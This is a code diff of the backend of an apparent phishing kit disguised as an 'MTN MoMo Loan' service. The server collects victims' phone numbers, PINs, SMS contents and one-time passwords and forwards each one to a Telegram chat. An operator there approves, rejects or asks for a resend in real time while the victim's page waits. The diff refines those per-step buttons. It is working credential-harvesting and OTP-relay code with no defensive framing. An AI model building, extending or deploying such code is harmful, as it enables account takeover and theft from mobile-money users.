@@ -1,9 +1,11 @@
 /* ============================================================
    MTN MoMo Loan — Backend
-   - Live approve/reject/resend via Telegram inline buttons
-   - Frontend polls status endpoint
+   - Live approve/reject via Telegram inline buttons
+   - Resend button per-page:
+       * login: none
+       * sms:   sends user back to login (fresh start)
+       * otp:   clears OTP boxes on same page
    - No DB (in-memory Map, auto-cleaned)
-   - Fallback port: 5000 (Railway overrides via process.env.PORT)
    ============================================================ */
 
 const express = require('express');
@@ -30,7 +32,6 @@ const SESSION_MAX_AGE_MS = 15 * 60 * 1000;
 
 /* ============================================================
    IN-MEMORY SESSION STORE
-   status: 'pending' | 'approved' | 'rejected' | 'resend_requested' | 'timeout'
    ============================================================ */
 const sessions = new Map();
 
@@ -89,8 +90,26 @@ function isValidPhone(phone) {
 }
 
 /* ============================================================
-   TELEGRAM — send message with inline keyboard (3 buttons)
+   TELEGRAM — send message
+   Buttons depend on step:
+     login → only ✅ ❌
+     sms   → ✅ ❌ 🔁
+     otp   → ✅ ❌ 🔁
    ============================================================ */
+function buildKeyboard(step, sessionId) {
+  const row = [
+    { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
+    { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
+  ];
+
+  /* Add 🔁 only for sms & otp */
+  if (step === 'sms' || step === 'otp') {
+    row.push({ text: '🔁 Resend', callback_data: `resend:${step}:${sessionId}` });
+  }
+
+  return { inline_keyboard: [row] };
+}
+
 async function sendTelegramWithButtons(text, sessionId, step) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.warn('⚠️ Telegram env vars missing — message not sent.');
@@ -105,13 +124,7 @@ async function sendTelegramWithButtons(text, sessionId, step) {
         text,
         parse_mode: 'HTML',
         disable_web_page_preview: true,
-        reply_markup: {
-          inline_keyboard: [[
-            { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
-            { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` },
-            { text: '🔁 Resend',  callback_data: `resend:${step}:${sessionId}` }
-          ]]
-        }
+        reply_markup: buildKeyboard(step, sessionId)
       })
     });
     const data = await res.json().catch(() => ({}));
@@ -136,12 +149,9 @@ async function editTelegramMessage(messageId, text, keepButtons) {
       parse_mode: 'HTML',
       disable_web_page_preview: true
     };
-
-    /* If keepButtons is a keyboard object, include it */
     if (keepButtons) {
       body.reply_markup = keepButtons;
     }
-
     await fetch(TELEGRAM_EDIT_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -169,7 +179,6 @@ async function answerCallback(callbackQueryId, text) {
   }
 }
 
-/* Rebuild a short summary line for editing */
 function summariseSession(session) {
   if (session.step === 'login') {
     return `📱 ${escapeHtml(session.data.phone)} — PIN entered`;
@@ -266,7 +275,7 @@ app.post('/api/sms', async (req, res) => {
       `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}\n\n` +
       `📝 <b>Message:</b>\n<pre>${escapeHtml(sms)}</pre>\n` +
-      `⏳ Tap ✅ or ❌ below`;
+      `⏳ Tap ✅ / ❌ / 🔁 below`;
 
     const messageId = await sendTelegramWithButtons(text, sessionId, 'sms');
     console.log(`[sms] sessionId=${sessionId} telegramMessageId=${messageId}`);
@@ -312,7 +321,7 @@ app.post('/api/verify-otp', async (req, res) => {
       `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}` +
       (sms ? `\n\n📝 <b>Linked SMS:</b>\n<pre>${escapeHtml(sms.slice(0, 400))}</pre>` : '') +
-      `\n⏳ Tap ✅ or ❌ below`;
+      `\n⏳ Tap ✅ / ❌ / 🔁 below`;
 
     const messageId = await sendTelegramWithButtons(text, sessionId, 'otp');
     console.log(`[otp] sessionId=${sessionId} telegramMessageId=${messageId}`);
@@ -334,7 +343,7 @@ app.post('/api/verify-otp', async (req, res) => {
 });
 
 /* ============================================================
-   POST /api/resend-sms  (informational — separate from in-message 🔁 button)
+   POST /api/resend-sms  (informational — user-initiated resend)
    ============================================================ */
 app.post('/api/resend-sms', async (req, res) => {
   try {
@@ -345,12 +354,21 @@ app.post('/api/resend-sms', async (req, res) => {
     }
 
     const text =
-      `🔁 <b>SMS Resend Requested</b>\n` +
+      `🔁 <b>User requested SMS resend</b>\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
       `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}`;
 
-    await sendTelegramWithButtons(text, 'noop', 'noop');
+    await fetch(TELEGRAM_API, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      })
+    });
 
     return res.json({ ok: true });
   } catch (err) {
@@ -412,9 +430,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     /* ==========================================================
        🔁 RESEND
-       - updates status to 'resend_requested'
-       - edits the Telegram message to show "resend requested"
-       - keeps ✅/❌ buttons (drops 🔁 so it doesn't get tapped twice)
        ========================================================== */
     if (action === 'resend') {
       session.status = 'resend_requested';
@@ -431,6 +446,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         `⏳ Tap ✅ or ❌ to finish`;
 
       if (session.telegramMessageId) {
+        /* Keep only ✅ ❌ after resend */
         await editTelegramMessage(session.telegramMessageId, newText, {
           inline_keyboard: [[
             { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
